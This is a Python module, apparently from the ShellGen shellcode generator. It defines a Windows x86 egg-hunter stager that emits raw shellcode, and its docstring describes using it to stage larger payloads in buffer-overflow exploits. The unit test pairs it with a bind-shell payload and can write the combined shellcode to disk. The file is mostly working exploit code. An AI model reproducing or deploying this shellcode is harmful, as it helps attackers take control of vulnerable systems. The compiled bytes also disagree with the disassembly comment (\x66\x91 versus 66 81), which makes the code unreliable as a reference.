#!/usr/bin/env python

###############################################################################
## Egg Hunter in Windows/x86                                                 ##
## Shellcode for ShellGen                                                    ##
## Based on original code by Skape                                           ##
## http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf               ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Egg Hunter."

__all__ = ["Hunter"]

from shellgen import Stager

#-----------------------------------------------------------------------------#

class Hunter (Stager):
    """
    Egg Hunter.

    Egg Hunters look for the next stage shellcode in memory and jump to it.
    This is useful for getting around size limitations in buffer overflows,
    you send this stage as payload and the real payload (the next stage)
    anywhere else in memory, for example by sending an incomplete request to
    be processed by another thread of the target service in a remote exploit,
    or placing it somewhere within the exploit file in a client-side exploit
    for a file format bug.

    For more information see:
    [PDF] U{http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf}
    """

    # 00000000 6681CAFF0F or dx,0xfff
    # 00000005 42         inc edx
    # 00000006 52         push edx
    # 00000007 6A43       push byte +0x43
    # 00000009 58         pop eax
    # 0000000A CD2E       int 0x2e
    # 0000000C 3C05       cmp al, 0x5
    # 0000000E 5A         pop edx
    # 0000000F 74EF       jz 0x0
    # 00000011 B890509050 mov eax, 0x50905090
    # 00000016 8BFA       mov edi, edx
    # 00000018 AF         scasd
    # 00000019 75EA       jnz 0x5
    # 0000001B AF         scasd
    # 0000001C 75E7       jnz 0x5
    # 0000001E FFE7       jmp edi

    provides  = "pc"
    qualities = "stack_balanced"
    encoding  = "nullfree"
    length    = 32

    def __init__(self, next_stage, cookie = "\x90\x50\x90\x50"):
        if len(cookie) != 4:
            raise ValueError(
                "This shellcode only supports 4-byte cookies, got: %d bytes"
                % len(cookie)
            )
        self.__cookie = cookie
        next_stage = (cookie * 2) + next_stage
        super(Hunter, self).__init__(next_stage)

    @property
    def cookie(self):
        return self.__cookie

    def compile(self, state):
        return (
            "\x66\x91\xCA\xFF\x0F\x42\x52\x6A\x43\x58"
            "\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + self.cookie +
            "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        )

#-----------------------------------------------------------------------------#

def test():
    "Unit test."

    # True to write out shellcode samples to disk.
    WRITE = False
    #WRITE = True

    from shellgen.x86.win32.bindshell import BindShell
    payload = BindShell()
    hunter  = Hunter(payload)
    assert hunter.length == len(hunter.bytes)
    assert payload.bytes in hunter.next_stage.bytes
    assert hunter.cookie in hunter.next_stage.bytes
    assert hunter.cookie not in payload.bytes
    assert hunter.stages == [hunter.next_stage]

    # This is for manual testing.
    if WRITE:
        from shellgen.x86.nop import Nop
        open("Hunter.bin","wb").write(
            hunter.bytes + Nop(10).bytes + hunter.next_stage.bytes)
